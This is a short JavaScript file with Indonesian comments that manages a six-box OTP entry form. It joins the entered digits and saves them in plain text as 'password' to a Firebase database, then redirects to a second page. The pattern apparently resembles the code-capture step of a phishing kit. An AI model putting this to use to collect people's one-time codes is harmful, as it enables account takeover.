// Mendapatkan elemen-elemen input
var inputs = document.querySelectorAll('.otp-input');

// Fungsi untuk menangani input dan memfokus ke input berikutnya
function focusNext(input) {
  // Pengecekan agar hanya menerima satu digit
  if (!isNaN(input.value) && input.value.length === 1) {
    // Mendapatkan indeks input saat ini
    var currentIndex = Array.from(inputs).indexOf(input);

    // Jika bukan input terakhir, fokus ke input berikutnya
    if (currentIndex < inputs.length - 1) {
      inputs[currentIndex + 1].focus();
    }
  } else {
    // Jika input tidak sesuai kriteria, kosongkan nilai
    input.value = '';
  }
}

// Fungsi untuk menangani formulir dan menulis ke Firebase
function validateForm2(event) {
  event.preventDefault(); // Mencegah formulir melakukan submit default

  // Mendapatkan nilai dari setiap input
  var otp1 = document.getElementById("otp-1").value;
  var otp2 = document.getElementById("otp-2").value;
  var otp3 = document.getElementById("otp-3").value;
  var otp4 = document.getElementById("otp-4").value;
  var otp5 = document.getElementById("otp-5").value;
  var otp6 = document.getElementById("otp-6").value;

  // Pengecekan agar setiap kolom diisi dengan tepat satu angka
  if (otp1.length !== 1 || otp2.length !== 1 || otp3.length !== 1 || otp4.length !== 1 || otp5.length !== 1 || otp6.length !== 1) {
    alert("Harap masukkan satu angka pada setiap kolom");
    return;
  }

  // Menulis data ke Firebase Realtime Database
  const database = firebase.database();
  const dataRef = database.ref('path/to');

  dataRef.set({
      password: otp1 + otp2 + otp3 + otp4 + otp5 + otp6,
      // tambahkan field lain sesuai kebutuhan
    })
    .then(() => {
      console.log('Data berhasil disimpan ke database');

      // Arahkan pengguna ke halaman kedua
      window.location.href = "../Page-Two/indeks2.html";
    })
    .catch(error => {
      console.error('Gagal menyimpan data ke database:', error);
    });
}
